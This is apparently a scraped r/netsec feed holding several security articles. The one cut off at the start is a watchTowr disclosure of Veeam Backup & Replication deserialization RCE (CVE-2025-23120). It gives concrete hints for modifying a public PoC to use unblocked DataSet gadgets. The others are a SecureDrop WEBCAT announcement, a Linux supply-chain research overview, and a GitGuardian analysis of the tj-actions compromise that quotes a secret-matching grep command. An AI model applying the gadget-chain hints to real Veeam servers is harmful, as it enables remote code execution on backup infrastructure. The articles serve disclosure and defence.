cproxyBinaryFormatter.DeserializeCustom&lt;CRepairRec&gt;((string[])info.GetValue(\"RepairRecs\", typeof(string[]))).ToList&lt;CRepairRec&gt;(); // [1]\n\t\t\tthis.Version = info.GetInt64(\"Version\");\n\t\t\tthis.BackupId = (Guid)info.GetValue(\"BackupId\", typeof(Guid));\n\t\t\tthis.IsImported = info.GetBoolean(\"IsImported\");\n\t\t}\n\t//...\n\t//...\n\t}\n}\n</code></pre><p>At , it will call the <code>CProxyBinaryFormatter.DeserializeCustom</code> method on the attacker-controlled input, which will eventually lead us to the <code>Veeam.Backup.Core.CProxyBinaryFormatter.Deserialize&lt;T&gt;</code> method:</p><pre><code>public static T Deserialize&lt;T&gt;(string input)\n{\n\tT result;\n\ttry\n\t{\n\t\tbyte[] serializedType = Convert.FromBase64String(input);\n\t\tBinaryFormatter deserializer = new BinaryFormatter\n\t\t{\n\t\t\tBinder = new RestrictedSerializationBinder(false, RestrictedSerializationBinder.Modes.FilterByBlacklist) // [1]\n\t\t};\n\t\tresult = CProxyBinaryFormatter.BinaryDeserializeObject&lt;T&gt;(serializedType, deserializer);\n\t}\n\tcatch (Exception ex)\n\t{\n\t\tLog.Exception(ex, \"Binary deserialization failed\", Array.Empty&lt;object&gt;());\n\t\tthrow;\n\t}\n\treturn result;\n}\n</code></pre><p>At , the code defines the <code>RestrictedSerializationBinder</code> for the deserialization process. This binder is responsible for verifying the target deserialization type. Unfortunately, of course, it is based on a blacklist. It means that we can:</p><ol><li>Deserialize the  class.</li><li>Reach the internal deserialization mechanism, which is <strong>controlled by a blacklist.</strong></li></ol><p>This is a very nice chain of gadgets. </p><p>Nevertheless, we still need to verify the blacklist and see if it misses some commonly known deserialization gadgets. This list is defined in the <code>Veeam.Backup.Common.Sources.System.IO.BinaryFormatter.blacklist.txt</code> file, which is attached to the  as a resource.</p><p>This list originally missed the <code>System.Runtime.Remoting.ObjRef</code> gadget, which is publicly known and can be used to achieve the RCE. </p><p>Do you remember our intro points about the blacklist drawbacks?  is a relatively new gadget discovered <a href=\"https://x.com/mwulftange?ref=labs.watchtowr.com\">Markus Wulftange</a> and there is a relatively huge chance that this gadget is younger than the Veeam deserialization blacklist. </p><p>As we have poked fun at - even if your blacklist is the most accurate list of all the lists in the land, it’s very hard to maintain it.</p><p>Regardless, here is a screenshot from our previous blog post, where you can see the difference in the blacklist between different Veeam versions.</p><p>As expected, the patch was to extend the deserialization blacklist with the  gadget. </p><p>Luckily, and as we've alluded to, this is the last deserialization gadget to exist and ever be found, and so we can consider this matter resolved. </p><p>The truth is as usual, more brutal. If you're familiar with .NET  deserialization, you may quickly notice that this list still misses some known gadgets.</p><p>If you're reading security advisories and RFC specs before you sleep, and you stumble upon the <a href=\"https://www.veeam.com/kb4693?ref=labs.watchtowr.com\">Veeam KB 4693</a> advisory, you'll quickly notice CVE-2024-42455 - a vulnerability previously discovered by watchTowr Labs member Sina.</p><p>Sina, in his previous work, identified gadgets that could be used maliciously (for local file deletion or NTLM Relaying, as an example) but were not in the blacklist. </p><p>As a result, Veeam extended the blacklist again:</p><pre><code>System.CodeDom.Compiler.TempFileCollection\nSystem.IO.DirectoryInfo\n</code></pre><p>This list is getting better and better, and soon it will be extra perfect!</p><p>But, can we actually find something more there?</p><h3>Privileges Required to Reach Deserialization</h3><p>Before we proceed with the deserialization-based vulnerabilities, let’s verify the privileges required to exploit the Veeam .NET Remoting channel. </p><p>This is a part that introduces some confusion. When you look at the Veeam advisories for .NET Remoting based vulnerabilities, you find the following statement:</p><p><code>A vulnerability that allows an authenticated user with a role assigned in the Users and Roles settings on the backup server...</code></p><p>This is quite a confusing description, and we are not entirely sure who should be able to access this attack surface. Instead of speculating, we will just show you the real state of things.</p><p>We are exploiting the  and it seems that its authorization checks are implemented in the <code>Veeam.Backup.MountServiceLib.CMountServiceAccessChecker.HasAccess</code> method:</p><pre><code>public bool HasAccess(IIdentity identity, Permissions permission)\n{\n\tWindowsIdentity windowsIdentity = identity as WindowsIdentity;\n\tif (windowsIdentity == null)\n\t{\n\t\tLog.Error(\"Unknown identity: \" + identity.Name + \".\", Array.Empty&lt;object&gt;());\n\t\treturn false;\n\t}\n\tif (new WindowsPrincipal(windowsIdentity).IsInRole(WindowsBuiltInRole.User)) // [1]\n\t{\n\t\tLog.Message(LogLevels.HighDetailed, identity.Name + \" is in Users group.\", Array.Empty&lt;object&gt;());\n\t\treturn true;\n\t}\n\treturn CGenericAccessChecker.IsInBuiltinAdministrator(windowsIdentity) || CGenericAccessChecker.IsInBuiltinAdministrator(windowsIdentity) || CGenericAccessChecker.IsInBuiltinAdministratorWithUAC(windowsIdentity);\n}\n</code></pre><p>At , the code verifies if the user belongs to the  group. If yes, we will pass the check.</p><p>When a machine joins the active directory, the  group is added to the Windows hosts' local  group. </p><p>As long as you don’t have a hardened AD configuration (which doesn't extend  with domain users), the Veeam .NET Remoting deserialization sink can be accessed by any domain user. </p><p>The following screenshot presents our debugging session, where we can see that we have passed the check with the  user:</p><p>In the second screenshot, we can see that this user belongs to Domain Users group only.</p><p>By the magic of computers and code - we can confirm that all of these vulnerabilities are exploitable by any Domain User. Of course, as long as you have joined your backup server to your AD domain. </p><p>Luckily, no one ever does that.</p><h3>WT-2025-0014 RCE: xmlFrameworkDs gadget</h3><p>Once we figured out how to reach the deserialization sink based on the blacklist, this game becomes quite simple. Put simply - you only need to find a deserialization gadget which is not blacklisted and leads to some potentially malicious impact.</p><p>As we have already stated, abusable classes can be found not only in the .NET Framework, but also typically in the target product's codebase. </p><p>Luckily, Veeam Backup &amp; Replication has a huge codebase and contains dozens of massive DLLs. On the other hand, because we are targeting , it strongly narrows our gadget-searching capabilities. This is because  can only deserialize classes that fulfil specific conditions, like:</p><ul><li> attribute must be set for a class.</li><li>Magic deserialization methods need to be defined for a class (like the  based constructor).</li></ul><p>Nevertheless, we decided to take a look around, and we were quickly led to the <code>Veeam.Backup.EsxManager.xmlFrameworkDs</code> class:</p><pre><code>namespace Veeam.Backup.EsxManager\n{\n    [DesignerCategory(\"code\")]\n    [ToolboxItem(true)]\n    [XmlSchemaProvider(\"GetTypedDataSetSchema\")]\n    [XmlRoot(\"xmlFrameworkDs\")]\n    [HelpKeyword(\"vs.data.DataSet\")]\n    [Serializable]\n    public class xmlFrameworkDs : DataSet // [1]\n\n</code></pre><p>If you have ever read .NET-based deserialization research or used <a href=\"http://ysoserial.net/?ref=labs.watchtowr.com\">ysoserial.net</a>, you will notice the red flag right away.</p><p>At , you can see that  extends . This is a very common and popular RCE gadget. When you're able to deserialize , you get insta-RCE capabilities.</p><p>Now, let’s have a quick look at  magic constructor:</p><pre><code>protected xmlFrameworkDs(SerializationInfo info, StreamingContext context) : base(info, context, false) // [1]\n{\n  if (base.IsBinarySerialized(info, context))\n  {\n      this.InitVars(false);\n      CollectionChangeEventHandler value = new CollectionChangeEventHandler(this.SchemaChanged);\n      this.Tables.CollectionChanged += value;\n      this.Relations.CollectionChanged += value;\n      return;\n  }\n  //...\n}\n\t\n</code></pre><p>Here, we can see that <strong>will call its parent's constructor at .</strong> As its parent is , we get an easy RCE here. We just need to modify the  gadget and accordingly modify the type/assembly names.</p><p>In order to exploit this vulnerability, inspired readers and keyboard bashes can likely implement some modifications to Sina’s <a href=\"https://github.com/watchtowrlabs/CVE-2024-40711?ref=labs.watchtowr.com\">CVE-2024-40711 </a> PoC.</p><p>Firstly, you can replace   with  <code>DataSetTypeSpoofGenerator</code> in the :</p><pre><code>//ObjRefGenerator gen = new ObjRefGenerator();\nDataSetTypeSpoofGenerator gen = new DataSetTypeSpoofGenerator();\n</code></pre><p>In the <code>DataSetTypeSpoofGenerator.cs</code>, you can modify the  and  members:</p><pre><code>//info.AssemblyName = \"mscorlib\";\n//info.FullTypeName = typeof(System.Data.DataSet).AssemblyQualifiedName;\ninfo.AssemblyName = \"Veeam.Backup.EsxManager, Version=12.3.0.0, Culture=neutral, PublicKeyToken=bfd684de2276783a\";\ninfo.FullTypeName = \"Veeam.Backup.EsxManager.xmlFrameworkDs\";\n</code></pre><p>These vague hints should give you a rough idea on how to flawlessly exploit this vulnerability.</p><h3>WT-2025-0015 RCE: BackupSummary gadget</h3><p>The second deserialization gadget is <code>Veeam.Backup.Core.BackupSummary</code>. Let’s have a look at the class definition:</p><pre><code>namespace Veeam.Backup.Core\n{\n\t[DesignerCategory(\"code\")]\n\t[ToolboxItem(true)]\n\t[XmlSchemaProvider(\"GetTypedDataSetSchema\")]\n\t[XmlRoot(\"BackupSummary\")]\n\t[HelpKeyword(\"vs.data.DataSet\")]\n\t[Serializable]\n\tpublic class BackupSummary : DataSet // [1]\n</code></pre><p>And you know where this is going, right? There is a second class in the Veeam codebase, which also extends the . We can also use this class to achieve the RCE, just like this. There’s nothing more to add here.</p><h3>No Way, They Did It Again</h3><p>\"Give us the patches, tell us about them\" - we get it; nobody can wait with this amount of suspense to see what Veeam has done this time. Here it is:</p><p>Surprise surprise! We have added extra perfection to the perfected list! </p><p>Who could have possibly predicted this?</p><p>Having all the necessary means and tools, you can go on your own quest and try to bypass this perfected perfect blacklist all on your own! </p><p>Given the size of the Veeam codebase, we wouldn’t be surprised if other researchers now find numerous further feasible deserialization gadgets.</p><blockquote>As a side note: <strong>It will never make sense, and we do not agree, that a single CVE is sensible here given multiple avenues to exploit this perfect list of blacklisted classes</strong>.  If you only add the  to the blacklist, you can still use  to get the RCE. We’re sure you get the point.<p>Please just do this properly.</p></blockquote><p>It is hard for us to be positive about this, given the criticality of the solution, combined with the well-known and trodden ground of this solution being targeted by ransomware gangs.</p><p>We get chastised for not following someone else's random definition of responsible disclosure, but where is the accountability for vendors who update a text file every time their solution gets popped?</p><p>CVE-2025-23120 was assigned to these vulnerabilities.</p><p>If you have not patched your Veeam server and it is joined to your AD domain, you should probably take this seriously.</p><p>That would be all for the recent Veeam Backup &amp; Replication RCE vulnerabilities. We hope that we have provided yet another proof that protection of deserialization sinks with a blacklist should be illegal (this is not a serious comment, please).</p><p>No matter how perfect, or perfecteder and state-of-the-art your list is, somebody will eventually find a way to abuse it.</p><table><tbody><tr><td>Vulnerabilities discovered and reported to the vendor</td></tr><tr><td>watchTowr hunts across client attack surfaces for impact</td></tr><tr><td>Vendor acknowledges the receipt of vulnerabilities details</td></tr><tr><td>Vendor confirms the vulnerabilities and says the fix had been developed</td></tr><tr><td>Patch released and CVE-2025-23120 assigned</td></tr></tbody></table><p>At&nbsp;<a href=\"https://www.watchtowr.com/?ref=labs.watchtowr.com\">watchTowr</a>, we passionately believe that continuous security testing is the future and that rapid reaction to emerging threats single-handedly prevents inevitable breaches.</p><p>With the watchTowr Platform, we deliver this capability to our clients every single day - it is our job to understand how emerging threats, vulnerabilities, and TTPs could impact their organizations, with precision.</p><p>If you'd like to learn more about the&nbsp;<a href=\"https://www.watchtowr.com/?ref=labs.watchtowr.com\"></a><strong>, our Attack Surface Management and Continuous Automated Red Teaming solution,</strong>&nbsp;please get in touch.</p><div><div><section><div><section><h3>Gain early access to our research, and understand your exposure, with the watchTowr Platform</h3><a href=\"https://watchtowr.com/demo/\">REQUEST A DEMO</a></section></div></section></div></div>","contentLength":18724,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/netsec/comments/1jff8u9/by_executive_order_we_are_banning_blacklists/"},{"title":"13 inch Macbook","url":"https://www.apple.com/macbook-air/","date":1742426747,"author":"/u/Cheap_Thing1322","guid":6034,"unread":true,"content":"<p><em>Multitasker. Multifaster.</em> MacBook&nbsp;Air with M4 brings even more speed and fluidity to everything you do, like working between loads of apps and tabs, editing videos, or playing games like Sid Meier’s Civilization® VII. All with a silent, fanless&nbsp;design.</p><p><em>Neural Engine. Blazing fast for AI.</em> Thanks to the faster Neural&nbsp;Engine in the M4 chip, MacBook&nbsp;Air has even more powerful AI capabilities to enhance everything you do. From automatic camera frame centering to AI image upscaling to running the latest large language models, you’ll be more productive and creative than&nbsp;ever.</p><p><em>Live a full battery life.</em> MacBook&nbsp;Air has up to 18 hours of battery life. And it supports fast charge, getting up to 50 percent in just 30 minutes. So you can power through anything you’re working on without worrying about your&nbsp;battery.</p>","contentLength":824,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/netsec/comments/1jfb0u7/13_inch_macbook/"},{"title":"Introducing WEBCAT: Web-based Code Assurance and Transparency","url":"https://securedrop.org/news/introducing-webcat-web-based-code-assurance-and-transparency/","date":1742404022,"author":"/u/smaury","guid":5949,"unread":true,"content":"<p data-block-key=\"atfom\">We’ve been <a href=\"https://securedrop.org/news/anatomy-of-a-whistleblowing-system/#javascript\">saying it</a><a href=\"https://securedrop.org/news/how-to-research-your-own-cryptography-and-survive/#next_steps\">for</a><a href=\"https://securedrop.org/news/introducing-securedrop-protocol/#next_steps\">a while</a>: Verifiable browser code is on the critical path for a redesigned version of SecureDrop, not to mention something that would benefit the wider browser security ecosystem. In our <a href=\"https://securedrop.org/news/browser-based-cryptography/\">last post</a> on this topic, we outlined the more-than-decade-old problem and its relevance to SecureDrop using several case studies, and we laid out the core requirements as we see them.</p><p data-block-key=\"crq2c\">In this post, we introduce Web-based Code Assurance and Transparency, a project that supports verifiable in-browser code for single-page browser applications. Along with this post, we are publishing the <a href=\"https://github.com/freedomofpress/webcat\">WEBCAT project repository</a>; follow-up posts will provide more detailed information.</p><p data-block-key=\"epgq6\">WEBCAT is a multicomponent project; the easiest way to explain it is to start with the end-user experience. When a user visits a website that has enrolled in WEBCAT, before the site can load the content is checked against a signed manifest to ensure that it has not been tampered with (more on enrollment later). If everything checks out, the page loads normally. If, however, any content does not match what’s expected, the page load is aborted and a warning is displayed, protecting the user from potentially malicious content before it can execute.</p><p data-block-key=\"e8fb3\">Behind the scenes, a lot is going on to ensure that application developers can update their applications without requiring effort on the part of anyone hosting the web application. WEBCAT allows for a transparent, independently verifiable signing, verification, and update process, and ensures that the enrollment process itself can’t be abused. The project uses <a href=\"https://sigstore.dev/\">Sigstore</a>, <a href=\"https://sigsum.org/\">Sigsum</a>, and <a href=\"https://theupdateframework.io/\">The Update Framework</a>, among other components; details are below.</p><img alt=\"Screenshot of Jitsi Meet with the WEBCAT plugin enabled\" height=\"500\" src=\"https://media.securedrop.org/media/images/jitsi.width-800.png\" width=\"800\"><p data-block-key=\"7vps1\"><b><i>Proof-of-concept WEBCAT-enabled version of the Jitsi videoconferencing software, with the browser extension showing that all its components pass verification.</i></b></p><p data-block-key=\"aqdnt\">There are a few more things to keep in mind: who our users are and what were trying to protect them from.</p><p data-block-key=\"fr09c\">The users were trying to protect are engaged in an important, potentially high-stakes activity. Whether it’s using SecureDrop, GlobaLeaks, or another browser-based encryption tool, the user experience should minimize <a href=\"https://www.usenix.org/system/files/conference/soups2016/wsf16_paper-parkin.pdf\">cognitive burden</a> and provide safe defaults.</p><p data-block-key=\"9vuq5\">One use case that WEBCAT supports is that of site administrators self-hosting third-party applications — the backbone of the decentralized web. Self-hosted applications (like SecureDrop!) are often smaller, lower-traffic servers, where the resources and protections available to site administrators are limited compared to those of larger, centralized services.</p><p data-block-key=\"2mbt4\">In self-hosted deployments, a trusted application may be deployed on various hosts with different trust levels, and application developers and hosters are often distinct entities. An application developer should be able to ship signed updates without putting a maintenance burden on everyone self-hosting the application; similarly, an end user should be able to trust the application developer directly, rather than having to rely on assurances from an individual site owner or <a href=\"https://securedrop.org/news/browser-based-cryptography#and_yet_it_persists\">the server itself</a>.</p><p data-block-key=\"5o1f0\">WEBCAT is a project that lets  or service providers create and update signed artifacts attesting to the code that they are shipping;  enroll their domains that run these applications; and  automatically verify that the code they are served is authentic.  may independently observe, reproduce, and evaluate the entire process.</p><p data-block-key=\"dfskq\">The system is designed to fail closed for end users, meaning that a user doesn’t have to know or do anything to take advantage of the integrity mechanisms; they simply browse the web as they normally would.</p><img alt=\"Screenshot illustrating WEBCAT&amp;#x27;s &quot;fail closed&quot; behavior when a page fails verification\" height=\"500\" src=\"https://media.securedrop.org/media/images/webcat-error.width-800.jpg\" width=\"800\"><p data-block-key=\"c649t\"><b><i>When the WEBCAT browser extension fails to verify any part of a web application, it will not load any content or execute any scripts.</i></b></p><p data-block-key=\"2dpo4\">WEBCAT has four main components:</p><ul><li data-block-key=\"f50gv\">A <a href=\"https://github.com/freedomofpress/webcat/tree/main/tools/signing\">signing script</a> that allows application developers to generate a signed manifest to verify the content they intend to serve to users</li><li data-block-key=\"8h4rf\">A <a href=\"https://github.com/freedomofpress/webcat/tree/main/extension\">Firefox extension</a>, to provide the end user an in-browser integrity checking mechanism, which blocks code that fails integrity checks for enrolled websites and warns the user.</li></ul><p data-block-key=\"4gpdo\">WEBCAT does not depend on TLS, making it easy to integrate over other encrypted transport mechanisms, such as Tor Onion Services.<b>PLEASE NOTE: This is a developer preview; WEBCAT is not yet intended for production use.</b></p><p data-block-key=\"4g6p0\">We are open source software maintainers ourselves, and we know how much work goes into application development. WEBCAT aims to provide a developer-friendly path to code integrity. Here is how the process works from a developer perspective.</p><p data-block-key=\"4qthm\">First, developers ensure all their executable assets, such as JS, CSS, and their main HTML page, are static. They then sign an application manifest using <a href=\"https://www.sigstore.dev/\">Sigstore</a> and one or more <a href=\"https://docs.sigstore.dev/certificate_authority/oidc-in-fulcio/\">OIDC identities</a> with the help of our signing script. The signed manifest contains: application metadata; a data structure that includes a cryptographic hash and the corresponding path for assets that will be loaded directly in the browser; and one or more Content Security Policies. Signing operations are transparently logged and published to Sigstore’s transparency log, <a href=\"https://search.sigstore.dev/\">Rekor</a>.</p><p data-block-key=\"3h67o\">WEBCAT tries not to restrict or downgrade the set of browser security features available to application developers, so it is compatible with configurations such as multiple CSPs for a given domain. It also aims to support modern web features and services (sandboxing iframes, workers, WebAssembly), while still failing closed and blocking untrusted content by default. A list of supported features can be found <a href=\"https://github.com/freedomofpress/webcat/tree/main/Readme.md\">here</a>; more detailed information can be found in the preliminary <a href=\"https://github.com/freedomofpress/webcat/tree/main/docs/DeveloperGuide.md\">Developer Guide</a>.</p><h3 data-block-key=\"5cpr3\">Enrolling in the preload list</h3><p data-block-key=\"62uu4\">WEBCAT uses a preload list of enrolled domains, instead of real-time fetching, to protect source privacy and avoid leaking timing or domain-specific query information. An updater service periodically builds a reproducible, independently verifiable preload list of enrolled domains and their authorized signers from the Sigsum transparency log; the updated preload list is fetched automatically by the end user’s browser. The extension can then locally verify that an application manifest has all the necessary valid signatures to be considered trusted for a domain.</p><p data-block-key=\"eeq5g\">A site owner hosting an instance of this application then enrolls their domain using the WEBCAT enrollment server. In contrast to other enrollment processes such as typical Certificate Authority enrollment, the WEBCAT enrollment model includes a \"cooldown\" period before changes are applied. This prevents rapid changes, requiring the site administrator to prove continued control over a domain to prevent a website from being enrolled or de-enrolled by an unauthorized actor. The end user’s browser then fetches an updated preload list, and benefits from code integrity protections when visiting enrolled domains.</p><p data-block-key=\"3cgmr\">In the true spirit of open source, our excitement at sharing this contribution is rivaled only by our excitement at updating one of our <a href=\"https://github.com/freedomofpress/securedrop/issues/92\">oldest open GitHub tickets</a>. While we’ve emphasized the use case of smaller servers, self-hosted single-page applications, and Tor Onion Services, all of which describe the SecureDrop use case, we can see a variety of projects and platforms that could benefit from this type of privacy-first code integrity system.</p><p data-block-key=\"62l1r\">Were in early discussions with the Tor Project about delivering WEBCAT-like functionality through Tor Browser, and were grateful to the Tor team for its work on the project in an advisory capacity and providing crucial early feedback.</p><p data-block-key=\"amtdd\">FPFs work on WEBCAT has been made possible by funding from the Filecoin Foundation for the Decentralized Web. We are deeply grateful to FFDW for their support.</p>","contentLength":7638,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/netsec/comments/1jf1zwq/introducing_webcat_webbased_code_assurance_and/"},{"title":"Linux supply chain attack journey : critical vulnerabilities on multiple distribution build & packaging systems","url":"https://fenrisk.com/supply-chain-attacks","date":1742377792,"author":"/u/SzLam__","guid":5093,"unread":true,"content":"<div><b> This article is part of a series on the security of the infrastructure of Linux distributions—don’t forget to read our articles on <a href=\"https://fenrisk.com/pagure\"></a> and <a href=\"https://fenrisk.com/open-build-service\"></a></b></div><p>Supply chain attacks have been a trendy topic in the past years. Rather than directly attacking their primary target, attackers infiltrate less secure assets, such as software depenencies, firmware, or service providers, to introduce malicious code. In turn, these components also have their own layers of dependencies, and we can start to understand why this becomes a very complex problem.</p><p>Most of the coverage of such attacks focusses typosquatting issues, where attackers register in hope of developers using these dependencies by mistake. Software registries are flooded with such malicious packages, but the risk is minimal.</p><p>More recently, in March 2024, a “Jia Tan” carried out a supply chain attack on several Linux distributions by compromising an important upstream dependency called XZ Utils. They contributed to the project for three years to later became an official maintainer and start pushing malicious code to   on February 2024. While  is not a direct dependency of OpenSSH, Linux distributions often patched the server to add , which in turn brought . The analysis revealed that the backdoor allowed the attacker to bypass the SSH administration protocol’s authentication process under certain conditions.</p><p>The resources needed to perform such an attack are substantial: it required real and credible development work over three years to become a maintainer of a software component of the target, with a high risk of detection. Only states or criminal groups can afford this and make it happen at scale.</p><p>This was undoubtedly out of reach for us. At the same time, it precisely targeted a specific library in the dependency tree of OpenSSH. <b>But what would it take to compromise an entire Linux distribution directly through their public infrastructure?</b> Is it possible to perform such a compromise as simple security researchers with no available resources but time?</p><h5><u>Attacks against the infrastructure of Linux distributions</u></h5><p>In the wild, we are only aware of a few detected compromises of the infrastructure of open-source projects.</p><p>Public researchers have also done their part. Research has been conducted on the security of package management systems like <a href=\"https://justi.cz/security/2021/04/20/cocoapods-rce.html\"></a>, <a href=\"https://blog.ryotak.net/post/pypi-potential-remote-code-execution-en/\"></a>,  <a href=\"https://www.sonarsource.com/blog/php-supply-chain-attack-on-composer/\"></a>, <a href=\"https://www.sonarsource.com/blog/php-supply-chain-attack-on-pear/\"></a>, etc.</p><h5><u>The development model of Linux distributions</u></h5><p>The development process of distributions is handled by maintainers. Linux distributions are made up of an ecosystem of independent open source projects built around a Linux kernel. These projects are developed, tested, and maintained by their own communities and developers. The maintainers of Linux distributions are responsible for retrieving the source code of each independent project (upstream), modifying the source code for integration or to address bug issues, building, and providing the packages to the distribution’s users. In parallel, downstream distributions (e.g Red Hat is downstream of Fedora) can also reuse these packages and add their own touch to it.</p><p>This cycle is summed up in the schema below:</p><p>Linux distribution maintainers need a software infrastructure to manage source code, build packages, sign them to ensure authenticity for users, and then distribute them to their communities.</p><p>If we consider compromising an entire Linux distribution, we have to compromise its software infrastructure to backdoor packages before the signing process. Otherwise, the community won’t consider the backdoored package as a legitimate package. Therefore, we need to compromise one of the following three steps:</p><ul><li>Directly in the dependent projects ().</li><li>The source code management system ().</li><li>The package build toolchain ().</li></ul><p>The XZ compromise has shown that the resources needed to compromise an upstream are substantial and the risks of detection are high (from the attacker’s perspective). We also don’t want to engage in any kind of social engineering and take the risk of harming maintainers or users.</p><p>With these things in mind, we could start by looking at the weakest links of these infrastructures. These distributions are built in the open and their documentation helped us identify the various services they deploy. For instance, in the case of Fedora, <a href=\"https://apps.fedoraproject.org\"></a> is a good start. </p><p>The good thing about all these services is that they are all likely open-source, thus easy to deploy in our testing lab, and even sometimes developed by contributors of these distributions because of the unique constraints of their development model. These are also often self-service applications, open to all contributors, which increases their overall attack surface. </p><p>Another important factor of our approach is that we are only interested in quick wins—no need for exhaustivity here and a single good bug will do. We always had a sweet tooth when it came to argument injection bugs, so we fired up strace and started working.</p><p>We successfully identified vulnerabilities in the Pagure, the Git forge used by Fedora to store their package definitions. We also compromised Open Build Service, the all-in-one toolchain used and developed by the openSUSE project for compilation and packaging. </p><p>Their exploitation by malicious actors would have led to the compromise of all the packages of the distributions Fedora and openSUSE, as well as their downstream distributions, impacting millions of Linux servers and desktops.</p><p>Technical details of our findings are described in the articles below:</p><p>Compared to XZ, these attacks are within the reach of most developers and security professionals. Both rely on the same common bug class (argument injections), and only required a few days of work (disclosure included).</p><p>Even though we only have limited expertise on this topic, we don’t think there’s a silver bullet to address the risks caused by the compromise of such central pieces of infrastructure. We looked into artifact integrity frameworks like SLSA but for now the threat Threat: Exploit a vulnerability in the implementation of the source code management system to bypass controls is out of the scope of <a href=\"https://slsa.dev\"></a> and that’s understandable! </p><p>For Pagure, we think the focus would need to be on producing third-party attestations for all package specifications, patches, and configuration files created by distribution maintainers. This system needs to be decorelated from Pagure so pushing to a Git repository on a compromised instance wouldn’t produce a valid attestation. It would also require all data fetched from upstream sources to be authenticated in some fashion too, which is still unrealistic to expect because of the wide range of upstream development processes and support level. Note that per Fedora <a href=\"https://docs.fedoraproject.org/en-US/packaging-guidelines/#_verifying_signatures\"></a>, the validation of upstream GPG signatures, if any, happens in the spec file and could also be removed if not signed.</p><p>For Open Build Service, the situation is more complex because compromised workers can alter both input and output files, breaking previous attestations in subtle ways. Reproducible build also become a necessity and are a notoriously hard problem to tackle. At the same time, pulling pre-compiled packages is optional and companies could absolutely deploy their own internal instance on their infrastructure.</p><p>We also think that SCA tooling has a role to play here. It can help identify which supply chains you depend on, and understand their security level to reduce exposure or contribute back to them for the benefit of everyone.</p><p>These are often maintained and operated by a handful of individuals in their free time, and they could greatly benefit from security audits and sponsored feature development. A great example of that is <a href=\"https://blog.pypi.org/posts/2024-11-14-pypi-now-supports-digital-attestations/\"><b>the recent addition of package attestations to PyPy</b></a>, designed / funded by the Sovereign Tech Agency and the Google Open Source Security Team, and implemented by Trails of Bits. We hope to see this happen everywhere else as well.</p><p>Finally, the fact we found these vulnerabilities doesn’t mean these distributions are less secure that others. On the contrary, the reactivity and efficiency of the maintainers we worked with is beyond what we see in the industry—kudos again to them.</p><p>The slides of the talk at insomni'hack 2025 are available below.</p>","contentLength":8161,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/netsec/comments/1jetbh3/linux_supply_chain_attack_journey_critical/"},{"title":"Compromised tj-actions/changed-files GitHub Action: A look at publicly leaked secrets","url":"https://blog.gitguardian.com/compromised-tj-actions/","date":1742322774,"author":"/u/mabote","guid":3307,"unread":true,"content":"<p>On March 14, 2025, a popular GitHub action named <a href=\"https://github.com/tj-actions/changed-files?ref=blog.gitguardian.com\"></a> was compromised and backdoored to dump secrets manipulated by the CI. While the origin of the compromise is still unknown, the payload added to this action is now well <a href=\"https://www.stepsecurity.io/blog/harden-runner-detection-tj-actions-changed-files-action-is-compromised?ref=blog.gitguardian.com\"><u>understood and documented.</u></a></p><p>In this blog, we'll talk about the attack's impact, patterns of secrets, and remediation steps to protect your workflows.</p><p>The first stage is a base64 string containing a shell script that downloads and executes the next stage on Linux only. The second stage is a combination of Python and Shell scripts that dumps memory, and looks for the<em><code>\"[^\"]+\":\\{\"value\":\"[^\"]*\",\"isSecret\":true\\}</code></em> pattern, encodes it twice with base64 and prints the results.</p><p>This mode of operation is common to other known compromises of GitHub actions, such as the <a href=\"https://blog.gitguardian.com/the-ultralytics-supply-chain-attack-connecting-the-dots-with-gitguardians-public-monitoring-data/\"><u>Ultralytics supply chain attack</u></a> from December 2024. However, the secrets are not only exfiltrated for the attacker's benefit but are also printed in the logs. If these are public and have not been deleted since 14 March, anyone can retrieve them.</p><p>This intrigued us, and we did an initial manual analysis to see if we could find any secrets ourselves. Since GitGuardian knows everything that happens on GitHub, we were able to quickly identify repositories where the compromised action was used, and extracted three distinct patterns.</p><p>The first one is not easy to identify visually. The next two images are from the same workflow. The corresponding jobs were run a few minutes apart. The first is normal: the action behaves as it should, looking for modified files. The second is different: you can see two empty lines. They indicate that the payload was executed, but no secrets were leaked.</p><p>To reproduce this behavior, simply type the following command to mimic the second stage payload :</p><pre><code>B64_BLOB=$(echo -n ‘No interesting secret here’ | tr -d ‘\\0’ | grep -aoE ‘’[^‘]+’:\\\n{‘value’:‘[^’]*’, “isSecret”:true\\\n}' | sort -u | base64 -w 0 |base64 -w 0)\necho $B64_BLOB</code></pre><p>The second pattern starts with the following double base64 string prefix.</p><p>The third pattern, as you might expect, contains other kinds of secrets. In our manual analysis, the first one we found was a <a href=\"https://docs.gitguardian.com/secrets-detection/secrets-detection-engine/detectors/specifics/zapier_webhook_url?ref=blog.gitguardian.com\"></a>. Interestingly, this type of secret is perfectly detected by GitGuardian and <a href=\"https://github.com/GitGuardian/ggshield?ref=blog.gitguardian.com\"></a>, unlike other competing solutions.</p><p>It is now clear that interesting and valid secrets are publicly available. The question becomes: is it possible to find them automatically and at scale?</p><p>Thanks to the dataset available at GitGuardian, we retrieved commits from the last 6 months that contain the  string in a yaml file located at . In total, this represents 85k patches spread across 14k different GitHub repositories.</p><p>From an attacker's perspective, they look like interesting targets as only 30% of the patches use a pinned commit of the tj-actions/changed-files GitHub actions. In other words, 70% are likely vulnerable to the March 14th attack if a corresponding job was run during the exploitation window.</p><p>We analyzed all these candidate repositories using the following steps:</p><ol><li>List workflow runs during the attack window</li><li>Filter the results based on the previously observed workflow</li><li>Collect the logs of the job candidates</li><li>Check for the presence of leaked secrets</li></ol><p>Our results show that only 1104 workflows ran during the attack timeframe. Among those, only 276 show a sign of exploitation. Moreover, 15 runs were affected by the attack but did not have any secrets available at the time of exploitation and, therefore did not have any leaked secrets.</p><p>At the time of analysis, 256 runs over 237 repositories had their logs deleted after following the recommended remediation steps. It still represents less than 25% of repositories.</p><p>Overall, the severity of this attack depends on the secrets available at the time of exploitation. Our research found that, out of the 603 secrets exposed in the attack, 466 (77%) are temporary GitHub tokens that are automatically generated by the CI for the duration of the workflow run. These only pose a risk if they are exploited before the workflow job expires.</p><p>This challenges the attacker’s strategy. Indeed, by choosing to leak secrets in the CI logs, the attacker was probably unable to collect them quickly and automatically. This made short-lived secrets, such as temporary GitHub tokens, more difficult to exploit. This may indicate that the attack was targeted toward a specific vulnerable repository rather than an attempt at a mass compromise.</p><p>Other secrets we found 